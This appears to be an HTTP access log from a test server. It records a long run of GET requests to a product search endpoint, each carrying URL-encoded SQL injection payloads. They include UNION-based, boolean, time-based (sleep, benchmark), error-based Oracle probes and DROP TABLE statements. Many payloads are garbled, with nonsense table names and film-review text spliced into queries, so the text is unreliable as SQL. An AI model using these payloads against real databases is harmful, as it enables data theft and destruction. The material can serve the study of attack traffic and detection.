Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /produtos/busca/?nome=-4736%27+%29+%29+or+elt+%28+5835+%3D+5509%2C5509+%29+and+%28+%28+%27iawg%27+%3D+%27iawg&categoria=-4736%27+%29+%29+or+elt+%28+5835+%3D+5509%2C5509+%29+and+%28+%28+%27iawg%27+%3D+%27iawg HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+and+6055+%3D+ctxsys.drithsx.sn+%28+6055%2C+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+6055+%3D+6055+%29+then+1+else+0+end+%29+from+dual+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+118+%29+%7C%7Cchr+%28+122+%29+%7C%7Cch&categoria=1%22+%29+%29+and+6055+%3D+ctxsys.drithsx.sn+%28+6055%2C+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+6055+%3D+6055+%29+then+1+else+0+end+%29+from+dual+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+118+%29+%7C%7Cchr+%28+122+%29+%7C%7Cch HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+and+elt+%28+4249+%3D+4249%2C7259+%29+and+%28+%28+%27ujar%27+%3D+%27ujra&categoria=1%27+%29+%29+and+elt+%28+4249+%3D+4249%2C7259+%29+and+%28+%28+%27ujar%27+%3D+%27ujra HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-9940%22+%29+where+3077+%3D+3077+union+all+select+3907%2C3907%2C3907%2C3907%2C3907+--&categoria=-9940%22+%29+where+3077+%3D+3077+union+all+select+3907%2C3907%2C3907%2C3907%2C3907+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade%2C+%28+1%2C0x4%29%2C%28SELECT+0x1%29+%29&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade%2C+%28+1%2C0x4%29%2C%28SELECT+0x1%29+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl%24%2C+1%2C1%2C1%2C0%2C1%2C19%2C0x71%2C1061%2C1061+--&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl%24%2C+1%2C1%2C1%2C0%2C1%2C19%2C0x71%2C1061%2C1061+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cresecader+is+nubl+%24+hencavernent+%28+2x+selEcT+%40%40vers+iNOn%2F%2AGow+h%29+WWOw+wwon+win+to+Sigger+Hy+De+Nice+or&categoria=%27+UNION+SELECT+%28+table_samerial%2Cresecader+is+nubl+%24+hencavernent+%28+2x+selEcT+%40%40vers+iNOn%2F%2AGow+h%29+WWOw+wwon+win+to+Sigger+Hy+De+Nice+or HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Ccharal+leve_froc%24vale_tabe+%29+%3B&categoria=%27+UNION+SELECT+%40+%2C+users%2Ccharal+leve_froc%24vale_tabe+%29+%3B HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+and+%27y%27+%3D+%27y&categoria=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+and+%27y%27+%3D+%27y HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%29%2C+all+ther+%28..ble_table+%29+%3C%3E&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%29%2C+all+ther+%28..ble_table+%29+%3C%3E HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+--&categoria=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verale_tembent+table_tabem_teb_+%28+ANCT+ID+%3D+%271&categoria=%27+UNION+SELECT+%40+verale_tembent+table_tabem_teb_+%28+ANCT+ID+%3D+%271 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verale+%28tebcanner_user%29+G+%28+sELECT+%40%29+--&categoria=%27+UNION+SELECT+%40+verale+%28tebcanner_user%29+G+%28+sELECT+%40%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+_%28+%2CSELECT+%40%40VERSION%29+--&categoria=%27+UNION+SELECT+_%28+%2CSELECT+%40%40VERSION%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+userschamelver+1+try%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%2C+userschamelver+1+try%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verale_chman+%28+213%29%2C2b1211001101001%2C112%2C1+AS&categoria=%27+UNION+SELECT+%40+verale_chman+%28+213%29%2C2b1211001101001%2C112%2C1+AS HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cresecader+is+in+%28+1+%29+%3E+1%2C1%2C1+--&categoria=%27+UNION+SELECT+%28+table_samerial%2Cresecader+is+in+%28+1+%29+%3E+1%2C1%2C1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmateline+%28+%27Ybad%27%2C%40%27bEns%27%2CvELS+%28+and+%27%3F%27+LIke+%270%27+OR+2417%3D0b0b100101101000001000101010100101111111011+AND+True+AND&categoria=%27+UNION+SELECT+%40+verseoncmateline+%28+%27Ybad%27%2C%40%27bEns%27%2CvELS+%28+and+%27%3F%27+LIke+%270%27+OR+2417%3D0b0b100101101000001000101010100101111111011+AND+True+AND HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cwame_ters%2Celp_%29+tumt+%29+%3B+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cwame_ters%2Celp_%29+tumt+%29+%3B+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade%2Ccall+ing_nume%3B+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade%2Ccall+ing_nume%3B+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmateberpease_tabes%27%29+AND+%27i%27%3D%27i&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmateberpease_tabes%27%29+AND+%27i%27%3D%27i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl_%2C+V1%2CSLEEP_%28%285+1+%29+%29+AND+1+iN+%3D+1+--&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl_%2C+V1%2CSLEEP_%28%285+1+%29+%29+AND+1+iN+%3D+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_sermate_series+%28+5%2C1+%2C+%29+%3E+.+%29+%2C+1+wainf+For+tall_sutelen.%27+--&categoria=%27+UNION+SELECT+%28+table_sermate_series+%28+5%2C1+%2C+%29+%3E+.+%29+%2C+1+wainf+For+tall_sutelen.%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_NiBL%3B+%3D+%271%2CvERSION+%28+%29+AnD+%22is%22+NOT+LiKe+%22aiN%22+OR+%22i%22+noT+lIke+%22&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_NiBL%3B+%3D+%271%2CvERSION+%28+%29+AnD+%22is%22+NOT+LiKe+%22aiN%22+OR+%22i%22+noT+lIke+%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C%28uclecnamelect%27%3B%3B%27&categoria=%27+UNION+SELECT+%40+%2C%28uclecnamelect%27%3B%3B%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_NibL%2C+SHINT+UNIME+%29+%2C+1+--&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_NibL%2C+SHINT+UNIME+%29+%2C+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verale_tembent+table+tp+sebme&categoria=%27+UNION+SELECT+%40+verale_tembent+table+tp+sebme HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+lyse+%3Brom%24+%29+%29+%29+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+lyse+%3Brom%24+%29+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_NiML+%2C+%28+%27aD%2C+iNt%24+%28+SELEcT+DISTINCT+%28+PaSSwOrd%2C+%29+%2C&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_NiML+%2C+%28+%27aD%2C+iNt%24+%28+SELEcT+DISTINCT+%28+PaSSwOrd%2C+%29+%2C HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_schema%2Ctable_name+FROM+iname_1%3B&categoria=%27+UNION+SELECT+table_schema%2Ctable_name+FROM+iname_1%3B HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_sectame_berpyabbale+caltfrod+by+paperperck%281%29&categoria=%27+UNION+SELECT+table_sectame_berpyabbale+caltfrod+by+paperperck%281%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28+%29%2C%40%2C0%2C0x4%2C%28select+0%29+--+1&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28+%29%2C%40%2C0%2C0x4%2C%28select+0%29+--+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_nible%2C+vible+nAme+%27+%2C+%3D+%27SELECT+UNICT+%28+PERSTAPE_+%28+%29+From+sysibm.systables+as+t1%2Csysibm.systables+as+t3+%29+and+%28+%28+%22aipb%22+%3D+%22aiby+--&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_nible%2C+vible+nAme+%27+%2C+%3D+%27SELECT+UNICT+%28+PERSTAPE_+%28+%29+From+sysibm.systables+as+t1%2Csysibm.systables+as+t3+%29+and+%28+%28+%22aipb%22+%3D+%22aiby+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+-+Table_name%2C+DRO%3A+iN+%3B%26%26+%28select+1%29%2C%40%40version+--&categoria=%27+UNION+SELECT+-+Table_name%2C+DRO%3A+iN+%3B%26%26+%28select+1%29%2C%40%40version+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl_+%29+%2CvERsiMN+%28+%2C+%28+1%2Cselect+%3B%28+elt+%28+%28SElEct+0X1%29+%29&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl_+%29+%2CvERsiMN+%28+%2C+%28+1%2Cselect+%3B%28+elt+%28+%28SElEct+0X1%29+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture+%27ex&categoria=%27+UNION+SELECT+%40+%2C+users%2Calecture+%27ex HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%3B%2Clib+py1%2C1+%29+%29+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%3B%2Clib+py1%2C1+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%2Cversocemant%29tebcaneest+namebib+%24+%3B+AnD+Ther+OR+False+OR&categoria=%27+UNION+SELECT+%40%2Cversocemant%29tebcaneest+namebib+%24+%3B+AnD+Ther+OR+False+OR HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEMANCULERSPANT+FUNNIEM+%27Sone+where+Peefly%27s%27+Giluf+is+in+this+sadly+worked+for+the+comperion+of+the+Sandra+Bullock.+Watching+the+film+is+a+very+good+movie.+I+was+expecting+a+book+with+the+Same+Gionce+in+the+world.+It+was+the+fact+that+this&categoria=%27%3B+DROP+TABLE+SEMANCULERSPANT+FUNNIEM+%27Sone+where+Peefly%27s%27+Giluf+is+in+this+sadly+worked+for+the+comperion+of+the+Sandra+Bullock.+Watching+the+film+is+a+very+good+movie.+I+was+expecting+a+book+with+the+Same+Gionce+in+the+world.+It+was+the+fact+that+this HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+Se&categoria=%27%3B+DROP+TABLE+Se HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEM%3B+UNOM+ALSE+%27HEAD+1+%3D+1%27+--&categoria=%27%3B+DROP+TABLE+SEM%3B+UNOM+ALSE+%27HEAD+1+%3D+1%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%23%22+--&categoria=%22+OR+%221%22%3D%221%23%22+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%23%22+AND+1+%3D+utl_inaddr.get_host_address+%28+%28+SELECT+DISTINCT+%28+table_name+%29+FROM+%28+SELECT+DISTINCT+%28+table_name+%29+%2C+ROWNUM+AS+LIMIT+FROM+sys.all_tables+%29+WHERE+LIMIT+%3D+4+%29+%29+AND+%27i%27+%3D+%27i&categoria=%22+OR+%221%22%3D%221%23%22+AND+1+%3D+utl_inaddr.get_host_address+%28+%28+SELECT+DISTINCT+%28+table_name+%29+FROM+%28+SELECT+DISTINCT+%28+table_name+%29+%2C+ROWNUM+AS+LIMIT+FROM+sys.all_tables+%29+WHERE+LIMIT+%3D+4+%29+%29+AND+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%27+%29+%29+and+2853+%3D+cast+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%29+%7C%7C+%28+select+%28+case+when+%28+2853+%3D+2853+%29+then+1+else+0+end+%29+%29+%3A%3Atext%7C%7C+%28+chr+%28+113+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+118+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+113+%29&categoria=1%25%27+%29+%29+and+2853+%3D+cast+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%29+%7C%7C+%28+select+%28+case+when+%28+2853+%3D+2853+%29+then+1+else+0+end+%29+%29+%3A%3Atext%7C%7C+%28+chr+%28+113+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+118+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+113+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+as+gygm+where+4024+%3D+4024&categoria=1+%29+%29+as+gygm+where+4024+%3D+4024 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-2125%22+%29+%29+or+8571+%3D+8571+--&categoria=-2125%22+%29+%29+or+8571+%3D+8571+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%27+%29+and+sleep+%28+5+%29+and+%28+%27%25%27+%3D+%27&categoria=1%25%27+%29+and+sleep+%28+5+%29+and+%28+%27%25%27+%3D+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+and+%28+3020+%3D+3020+%29+%2A6703+and+%28+%28+%28+%27ujds%27+%3D+%27ujds+--&categoria=1%27+%29+%29+%29+and+%28+3020+%3D+3020+%29+%2A6703+and+%28+%28+%28+%27ujds%27+%3D+%27ujds+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+hctn+where+81%2F%2A%2A%2F&categoria=1%27+%29+%29+as+hctn+where+81%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+tagg+where+1321+%3D+1312+and+8189+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+--&categoria=1%27+%29+as+tagg+where+1321+%3D+1312+and+8189+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-1011%25%22+or+1+group+by+concat+%28+0x7171706a71%2C+%28+select+%28+case+when+%28+4232+%3D+4232+%29+then+1+else+0+end+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+having+min+%28+0+%29+%23&categoria=-1011%25%22+or+1+group+by+concat+%28+0x7171706a71%2C+%28+select+%28+case+when+%28+4232+%3D+4232+%29+then+1+else+0+end+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+having+min+%28+0+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+wnyl+where+8978+%3D+8978+or+5286+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+--&categoria=1%27+%29+as+wnyl+where+8978+%3D+8978+or+5286+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%7C%7C+%28+select+%27svbf%27+where+7017+%3D+7017+or+elt+%28+6272+%3D+6272%2Csleep+%28+5+%29+%29+%29+%7C%7C%27&categoria=1%27%7C%7C+%28+select+%27svbf%27+where+7017+%3D+7017+or+elt+%28+6272+%3D+6272%2Csleep+%28+5+%29+%29+%29+%7C%7C%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+or+8315+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+and+%28+7338+%3D+7338&categoria=1+%29+or+8315+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+and+%28+7338+%3D+7338 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+%29+or+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+ydpu+%29+and+%28+%28+%28+%22djwo%22+%3D+%22djwo&categoria=1%22+%29+%29+%29+or+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+ydpu+%29+and+%28+%28+%28+%22djwo%22+%3D+%22djwo HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+pwvu+where+8267+%3D+8267&categoria=1+%29+as+pwvu+where+8267+%3D+8267 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-3885+%29+where+2387+%3D+2387+union+all+select+2387%2C2387%2C2387%2C2387%2C2387%2C2387%2C2387%23&categoria=-3885+%29+where+2387+%3D+2387+union+all+select+2387%2C2387%2C2387%2C2387%2C2387%2C2387%2C2387%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+vqbf+where+4020+%3D+4020&categoria=1+%29+as+vqbf+where+4020+%3D+4020 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+plbt+where+4368+%3D+4368+and+3754+%3D+%28+select+upper+%28+xmltype+%28+chr+%28+60+%29+%7C%7Cchr+%28+58+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+3754+%3D+3754+%29+then+1+else+0+end+%29+from+dual+%29+%7C%7Cchr+%28+1&categoria=1%27+%29+%29+as+plbt+where+4368+%3D+4368+and+3754+%3D+%28+select+upper+%28+xmltype+%28+chr+%28+60+%29+%7C%7Cchr+%28+58+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+3754+%3D+3754+%29+then+1+else+0+end+%29+from+dual+%29+%7C%7Cchr+%28+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=5X0B6%22+%29+%29+as+UsIK+whErE+%28SelecT+%28SELecT+%28SELECT+%28SELECT+9156%29%29%29%29+Like+0x25D7+RLIKE+%28+sEleCT+%2A+fROM+%28+SElECT+%28+sleeP+%28+%28SELECT+%28SELECT+%28SELECT+%28SELECT+0%29%29%29%29+%29+%29+%29+sGvO+%29+--&categoria=5X0B6%22+%29+%29+as+UsIK+whErE+%28SelecT+%28SELecT+%28SELECT+%28SELECT+9156%29%29%29%29+Like+0x25D7+RLIKE+%28+sEleCT+%2A+fROM+%28+SElECT+%28+sleeP+%28+%28SELECT+%28SELECT+%28SELECT+%28SELECT+0%29%29%29%29+%29+%29+%29+sGvO+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+or+4411+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+and+%28+%27ppwh%27+%3D+%27ppwh&categoria=1%27+%29+or+4411+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+and+%28+%27ppwh%27+%3D+%27ppwh HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+and+%28+%28+%28+%27juhi%27+like+%27juhi+--&categoria=select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+and+%28+%28+%28+%27juhi%27+like+%27juhi+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+count+%28+%2A+%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3+and+%28+%22%25%22+%3D+%22&categoria=select+count+%28+%2A+%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3+and+%28+%22%25%22+%3D+%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=I+loved+The+World+of+this+DVD+minutes+from+the+protuges+with+hour+and+as+his+strange+and+translation+of+disaster%2C+except+that+it+would+be+surprising+through+the+factoris%2C+a+very+strange+cameo+and+clean+drignter.+There+can+about+the+sense+of+marries%2C+and+w&categoria=I+loved+The+World+of+this+DVD+minutes+from+the+protuges+with+hour+and+as+his+strange+and+translation+of+disaster%2C+except+that+it+would+be+surprising+through+the+factoris%2C+a+very+strange+cameo+and+clean+drignter.+There+can+about+the+sense+of+marries%2C+and+w HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%7C%7C+%28+select+%27cclo%27+from+dual+where+6823+%3D+6823+and+9198+%3D+9198+--&categoria=1%27%7C%7C+%28+select+%27cclo%27+from+dual+where+6823+%3D+6823+and+9198+%3D+9198+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%7C%7C+%28+select+%27osty%27+from+dual+where+6433+%3D+6433+or+5286+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+%29+%7C%7C%27&categoria=1%27%7C%7C+%28+select+%27osty%27+from+dual+where+6433+%3D+6433+or+5286+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+%29+%7C%7C%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+or+7552+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29&categoria=1%27+%29+or+7552+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+as+casz+where+5921+%3D+5921+rlike+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+vwyq+%29+%23&categoria=1%22+%29+%29+as+casz+where+5921+%3D+5921+rlike+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+vwyq+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+where+6672+%3D+6672+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23&categoria=1%27+%29+where+6672+%3D+6672+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+as+usrk+where+6324+%3D+6234+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+--&categoria=1%22+%29+%29+as+usrk+where+6324+%3D+6234+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-3960%22+%29+%29+union+all+select+7813%2C7813%2C7813%2C7813%2C7813%2C7813+--&categoria=-3960%22+%29+%29+union+all+select+7813%2C7813%2C7813%2C7813%2C7813%2C7813+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+or+8514+%3D+benchmark+%28+5000000%2Cmd5+%28+0x544d5a4c+%29+%29+%23&categoria=1%27+%29+%29+or+8514+%3D+benchmark+%28+5000000%2Cmd5+%28+0x544d5a4c+%29+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-2246%22+%29+%29+union+all+select+4613%2C4613%2C4613%2C4613%2C4613%2C4613%23&categoria=-2246%22+%29+%29+union+all+select+4613%2C4613%2C4613%2C4613%2C4613%2C4613%23 HTTP/1.1
